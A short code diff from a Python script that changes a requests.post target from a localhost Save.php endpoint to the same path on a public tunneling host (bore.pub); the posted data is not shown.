@@ -24,7 +24,7 @@ data = {
 }
 
 
-url = 'http://127.0.0.1:80/Save.php'
+url = 'http://bore.pub:1983/Save.php'
 response = requests.post(url, data=data)
 
 # Check if the request was successful (HTTP status code 200)
